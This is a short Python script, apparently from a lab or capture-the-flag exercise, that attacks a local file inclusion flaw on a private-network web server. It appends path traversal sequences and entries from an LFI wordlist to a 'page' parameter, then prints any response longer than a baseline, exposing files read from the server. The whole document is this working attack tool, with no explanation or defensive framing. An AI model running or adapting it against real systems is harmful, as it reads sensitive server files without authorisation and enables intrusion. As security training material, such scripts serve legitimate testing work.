
import requests

url = 'http://10.10.88.249/lfi/lfi.php?page='
extended_url = '../../../../../..'

fd = open('/home/arrow/tools/wordlists/lfi.txt','r')

original_size = 94

for i in fd:

	r = requests.get(url + extended_url + i[0:-1])
	temp = len(r.text)
	temp2 = temp - (2*len(i[0:-1]))

	if temp2 > original_size:
		print(r.text)


fd.close()
